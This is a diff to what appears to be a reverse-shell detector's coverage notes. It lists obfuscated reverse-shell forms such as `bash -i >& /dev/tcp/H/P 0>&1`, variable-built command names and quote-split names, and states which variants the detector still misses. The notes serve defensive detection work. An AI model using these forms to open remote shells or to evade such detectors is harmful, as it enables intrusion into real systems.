@@ -438,7 +438,7 @@ silent gap by definition; `tests/test_threat_coverage_ledger.py` fails the build
   line than its body;
   (4) a command name or socket path that is only known at run time (`c=n; c+=c; $c -e sh`,
   `D=/dev/tcp/H/P; bash -i >& $D`, an expansion word in front of the command such as
-  `$E bash -i >& /dev/tcp/H/P 0>&1`), a command name quoted or escaped INSIDE the word
+  `$E bash -i >& /dev/tcp/H/P 0>&1`; NOT a ceiling since B-1062: a WHOLE payload held in a variable as one plain quoted literal and then run - `C="bash -i >& /dev/tcp/H/P 0>&1"; eval "$C"`, `sh -c "$C"`, or a bare `$C` for a metacharacter-free value - is read as the literal and convicted like the inline form, while a value built from other variables or `$(...)`, a copy through a second variable, `echo "$C" | bash` and a use that precedes the assignment in the source are still not), a command name quoted or escaped INSIDE the word
   (`ba""sh`, `b'a'sh`; a whole-word quote pair `"bash"` / `'nc'`, an ANSI-C `$'bash'` and a leading
   backslash ARE read as the command), a shell called `rbash`, `bash-static` or `bash.real`, `nc.exe`,
   `s.makefile()` as a shell's stdin, or a socket handed to another module; (5) wrappers the
